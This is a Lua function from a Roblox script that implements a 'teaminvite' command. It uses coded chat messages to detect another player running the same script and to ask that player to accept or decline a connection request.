commands.teaminvite1 = function(args)
    if dontuse then return end
    dontuse = true
    task.wait(.2)

    local firstSpace = string.find(args, " ")
    local plr, nick

    if firstSpace then
        plr = string.sub(args, 1, firstSpace - 1) 
        nick = string.sub(args, firstSpace + 1) 
    else
        plr = args
        nick = nil
    end


    local returntimer = false
    local target = getfullname(plr)
    local timer = 0
    local speakername = game.Players.LocalPlayer.Name
    connectionwithplr = false
    respondedmessage = false
    requestyes = false
    requestno = false

    if not game.Players:FindFirstChild(target) then
        error("invalid target")
        dontuse = false
        return
    end

    notif("Connecting to ".. target)

    for i = 1,20 do
        sc("..checkforusingthis218 ".. target)
        task.wait()
    end

    spawn(function()
        for i = 1,5 do
            wait(1)
            timer = timer + 1
        end
    end)

    repeat wait() until respondedmessage == true or timer == 5

    if not respondedmessage then 
        error("Target is not using this script.")
        dontuse = false
        return
    end

    if nick then
        sc("..".. target .."1215 ".. nick)
    else
        sc("..".. target .."1214")
    end
    wait(.1)
    sc("..getrequestername2834 ".. speakername)
    task.wait(.1)
    sc("..askforconnect8172 ".. target)
    wait()

    notif("Waiting for response...")

    spawn(function()
        wait(30)
        returntimer = true
    end)

    repeat wait() until requestyes or requestno or returntimer

    if requestyes then
        notif(target .." accepted the request")
        connectionwithplr = true
    elseif requestno then
        notif(target .. " declined the request")
        connectionwithplr = true
    elseif returntimer then
        error("Failed to fetch target's response")
        connectionwithplr = true
        task.wait(.5)
        notif("Closing request...")
    end

    task.wait(.2)
    dontuse = false
end


